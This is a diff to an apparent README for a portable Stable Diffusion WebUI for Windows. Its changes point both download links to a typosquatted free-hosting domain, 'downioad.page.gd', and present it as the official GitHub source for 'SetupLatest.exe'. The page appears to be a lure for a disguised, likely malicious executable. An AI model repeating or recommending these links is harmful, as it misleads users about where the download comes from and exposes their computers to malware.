@@ -2,7 +2,7 @@
 
 Stable Diffusion WebUI Portable 2026 is a comprehensive suite designed for Windows desktop users who want to leverage the power of Stable Diffusion for image generation. This tool offers a portable, easy-to-use solution with pre-configured settings and models, allowing you to create stunning visuals without complex setup. Whether you're an artist, designer, or hobbyist, this suite provides everything you need to dive into AI-powered creativity on your Windows 10 or 11 system.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -55,6 +55,6 @@ Updates are automatically prompted when available, or you can manually check for
 
 To get started with Stable Diffusion WebUI Portable 2026, download the installer from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link directs you to a secure download page where you can obtain the "SetupLatest.exe" file. Ensure you download only from this source to avoid unauthorized modifications. Last updated: 2026.
